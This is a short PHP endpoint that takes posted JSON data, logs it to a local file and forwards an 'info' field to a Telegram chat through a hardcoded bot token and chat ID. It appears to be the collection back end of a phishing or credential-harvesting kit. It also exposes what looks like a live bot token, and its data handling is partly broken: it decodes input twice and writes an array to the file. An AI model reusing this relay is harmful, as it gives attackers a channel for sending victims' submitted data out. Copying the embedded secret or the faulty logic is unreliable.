<?php
  $data = json_decode(file_get_contents('php://input'), true);
  header('Content-type: text/html');
  file_put_contents('data.txt', $data, FILE_APPEND);
  
  $botToken = "7686730302:AAF7xLyAnY6fqMZVDJAjbSjLEIjHSqLWwG4"; 
  $chatId = "1591603590"; 


  $decoded = json_decode($data,true);
  
if (is_array($decoded) && isset($decoded['info'])) {
    $message = $decoded['info'];
} else { $message = is_string($data) ? $data : "Invalid data formate ."; }
    
    $url = "https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
        'chat_id' => $chatId,
        'text' => $message
    ]);
    $response = file_get_contents($url);
  
?>
